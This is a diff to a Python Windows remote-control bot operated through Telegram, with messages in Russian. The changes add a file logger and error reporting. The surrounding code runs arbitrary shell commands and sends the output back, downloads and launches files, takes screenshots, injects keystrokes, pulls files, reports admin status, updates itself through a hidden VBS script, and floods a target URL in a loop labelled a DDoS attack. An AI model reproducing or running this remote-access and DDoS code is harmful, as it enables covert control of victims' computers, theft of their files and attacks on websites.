@@ -21,6 +21,24 @@ class Data:
     name = data["name_pc"]
     token = data["bot_token"]
 
+class Logger_Bot:
+    def __init__(self) -> None:
+        self.path = '\\logs\\'
+
+    def __save_log(self, text):
+        path_log = self.path + 'log_' + datetime.now().strftime('%Y-%m-%d').replace(' ','_').replace(':','-')
+        arg = 'w'
+        if os.path.exists(path_log):
+            arg = 'r+'
+        with open(path_log, arg) as new_log:
+            new_log.write(text)
+
+    def log(self, name_func, e_text):
+        time_e = datetime.now().strftime('%H:%M:%S').replace(' ','_').replace(':','-')
+        text = f"[{time_e}] {name_func}: {e_text}."
+        self.__save_log(text)
+        pass
+
 
 if not os.path.isdir('media'):
     os.mkdir('media')
@@ -35,7 +53,7 @@ if Data.update == 1:
 TOKEN_PC = [Data.name, Data.token]
 
 bot = telebot.TeleBot(TOKEN_PC[1])
-
+logger = Logger_Bot()
 
 class Func_API:
     def __init__(self) -> None:
@@ -43,17 +61,15 @@ class Func_API:
         self.tg_api = bot
         for ids in id:
             try:
-                try:
-                    if ctypes.windll.shell32.IsUserAnAdmin():
-                        bot.send_message(
-                            ids, f'{self.NAME_PC} запущен от имени администратора')
-                    else:
-                        bot.send_message(
-                            ids, f'{self.NAME_PC} запущен от имени обычного пользователя')
-                except:
-                    pass
+                if ctypes.windll.shell32.IsUserAnAdmin():
+                    bot.send_message(
+                        ids, f'{self.NAME_PC} запущен от имени администратора')
+                else:
+                    bot.send_message(
+                        ids, f'{self.NAME_PC} запущен от имени обычного пользователя')
+
             except telebot.apihelper.ApiTelegramException:
-                pyautogui.alert("Вы указали неверный токен")
+                logger.log('__init__', 'Вы указали неверный токен')
                 bot.stop_polling()
 
     def rasbiv(self, text):
@@ -84,38 +100,42 @@ class Func_API:
     def cmdo_ret(self, com):
         try:
             res = subprocess.check_output(com, shell=1)
-        except:
+        except Exception as e:
+            logger.log(self.cmdo_ret.__name__,e)
             return '🖥❌'
 
         try:
             res = res.decode('utf8')
-        except:
+        except Exception as e:
             try:
                 res = res.decode('cp866')
-            except:
+            except Exception as e:
                 return '🖥❌'
         return '🖥✅:\n'+res
 
     def cmdo(self, com):
         try:
             res = subprocess.check_output(com, shell=1)
-        except:
-            bot.send_message(self.id, '🖥❌')
+        except Exception as e:
+            logger.log(self.cmdo.__name__,e)
+            bot.send_message(self.id, f'🖥❌ \n{e}')
         try:
             res = res.decode('utf8')
         except:
             try:
                 res = res.decode('cp866')
-            except:
-                bot.send_message(self.id, '🖥❌')
+            except Exception as e:
+                logger.log(self.cmdo.__name__,e)
+                bot.send_message(self.id, f'🖥❌ \n{e}')
         bot.send_message(self.id, '🖥✅:\n'+res)
 
     def cmdi(self, com):
         try:
             os.system(com)
             bot.send_message(self.id, "🖥✅")
-        except:
-            bot.send_message(self.id, '🖥❌')
+        except Exception as e:
+            logger.log(self.cmdi.__name__,e)
+            bot.send_message(self.id, f'🖥❌ \n{e}')
 
     def exits(self):
         dir = os.listdir("media/")
@@ -152,46 +172,52 @@ class Func_API:
             # Отправка строки с информацией об IP-адресе
             bot.send_message(self.id, info_string)
         except requests.exceptions.ConnectionError:
+            logger.log(self.ip_address.__name__, 'Ошибка соединения')
             bot.send_message(self.id, 'Ошибка соединения')
 
     def wgt(self, text_comand):
         try:
             wget.download(text_comand[0], text_comand[1])
             bot.send_message(self.id, "🖥✅")
-        except:
-            bot.send_message(self.id, '🖥❌')
+        except Exception as e:
+            logger.log(self.wgt.__name__,e)
+            bot.send_message(self.id, f'🖥❌ \n{e}')
 
     def rebooting(self, timer):
         try:
             timer = "shutdown /r /t "+str(timer)
             os.system(timer)
             bot.send_message(self.id, "🖥✅")
-        except:
-            bot.send_message(self.id, '🖥❌')
+        except Exception as e:
+            logger.log(self.rebooting.__name__,e)
+            bot.send_message(self.id, f'🖥❌ \n{e}')
 
     def shotdowning(self, timer):
         try:
             timer = "shutdown /s /t "+str(timer)
             os.system(timer)
             bot.send_message(self.id, "🖥✅")
-        except:
-            bot.send_message(self.id, '🖥❌')
+        except Exception as e:
+            logger.log(self.shotdowning.__name__,e)
+            bot.send_message(self.id, f'🖥❌ \n{e}')
 
     def picture(self, file):
         try:
             command = f"media\\{file}.png"
             os.startfile(command)
             bot.send_message(self.id, "🖥✅")
-        except:
-            bot.send_message(self.id, '🖥❌')
+        except Exception as e:
+            logger.log(self.picture.__name__,e)
+            bot.send_message(self.id, f'🖥❌ \n{e}')
 
     def video(self, file):
         try:
             command = f"media\\{file}.mp4"
             os.startfile(command)
             bot.send_message(self.id, "🖥✅")
-        except:
-            bot.send_message(self.id, '🖥❌')
+        except Exception as e:
+            logger.log(self.video.__name__,e)
+            bot.send_message(self.id, f'🖥❌ \n{e}')
 
     def specifications(self):
         x, y = pyautogui.size()
@@ -210,8 +236,9 @@ Screen:        {x}x{y}"""
         try:
             keyboard.press_and_release("alt+shift")
             bot.send_message(self.id, "🖥✅")
-        except:
-            bot.send_message(self.id, '🖥❌')
+        except Exception as e:
+            logger.log(self.specifications.__name__,e)
+            bot.send_message(self.id, f'🖥❌ \n{e}')
 
     def screenshot(self):
         filename = f"screenshot_{datetime.now().strftime('%Y-%m-%d %H:%M:%S').replace(' ','_').replace(':','-')}.jpg"
@@ -231,43 +258,48 @@ Screen:        {x}x{y}"""
                 try:
                     index = button.index(i)
                     listing += i+"+"
-                except:
+                except Exception as e:
                     for kip in i:
                         listing += kip+"+"
             listing = listing[:-1].replace(' ', 'space')
             keyboard.press_and_release(listing)
             bot.send_message(self.id, "🖥✅")
-        except:
-            bot.send_message(self.id, '🖥❌')
+        except Exception as e:
+            logger.log(self.keyb.__name__,e)
+            bot.send_message(self.id, f'🖥❌ \n{e}')
 
     def print_gui(self, text):
         try:
             pyautogui.alert(text, "~")
             bot.send_message(self.id, '🖥✅')
-        except:
-            bot.send_message(self.id, '🖥❌')
+        except Exception as e:
+            logger.log(self.print_gui.__name__,e)
+            bot.send_message(self.id, f'🖥❌ \n{e}')
 
     def input_gui(self, text):
         try:
             answer = pyautogui.prompt(text, "~")
             bot.send_message(self.id, answer)
-        except:
-            bot.send_message(self.id, '🖥❌')
+        except Exception as e:
+            logger.log(self.input_gui.__name__,e)
+            bot.send_message(self.id, f'🖥❌ \n{e}')
 
     def closes(self):
         try:
             keyboard.press_and_release("alt+f4")
             bot.send_message(self.id, '🖥✅')
-        except:
-            bot.send_message(self.id, '🖥❌')
+        except Exception as e:
+            logger.log(self.closes.__name__,e)
+            bot.send_message(self.id, f'🖥❌ \n{e}')
 
     def start_file(self, path):
         try:
             text = "start media/"+path
             os.system(text)
             bot.send_message(self.id, '🖥✅')
-        except:
-            bot.send_message(self.id, '🖥❌')
+        except Exception as e:
+            logger.log(self.start_file.__name__,e)
+            bot.send_message(self.id, f'🖥❌ \n{e}')
 
     def direct(self, paths):
         try:
@@ -288,8 +320,9 @@ Screen:        {x}x{y}"""
                 except:
                     pass
             bot.send_message(self.id, exit_str)
-        except:
-            bot.send_message(self.id, '🖥❌')
+        except Exception as e:
+            logger.log(self.direct.__name__,e)
+            bot.send_message(self.id, f'🖥❌ \n{e}')
 
     def update_bot(self):
         pth = os.getcwd()
@@ -317,15 +350,14 @@ sh.Run "{pth}\\upd.bat", 0'''
             # Отправляем сообщение о начале DDOS атаки
             bot.send_message(self.id, f'DDOS атака на {url} успешно запущена')
         else:
-            bot.send_message(
-                self.id, f'Ошибка: неверный url, проверьте правильность введенных данных')
+            bot.send_message(self.id, f'Ошибка: неверный url, проверьте правильность введенных данных')
 
         while True:
             try:
                 # Отправляем GET запрос с данными
                 requests.get(url, headers=headers,
                              allow_redirects=True, stream=True)
-            except Exception:
+            except:
                 pass
 
     def pull_file(self, path: str):
@@ -349,8 +381,9 @@ sh.Run "{pth}\\upd.bat", 0'''
             linke = 'start ' + link
             os.system(linke)
             bot.send_message(self.id, '🖥✅')
-        except:
-            bot.send_message(self.id, '🖥❌')
+        except Exception as e:
+            logger.log(self.browser.__name__,e)
+            bot.send_message(self.id, f'🖥❌ \n{e}')
 
     def perfor(self, text, id_chat):
         self.id = id_chat
@@ -482,6 +515,7 @@ def handle_file(message):
                 new_file.write(downloaded_file)
             bot.reply_to(message, "🖥✅")
         except Exception as e:
+            logger.log('message_handler_doc',e)
             bot.reply_to(message, f"🖥❌\n{e}")
 
 
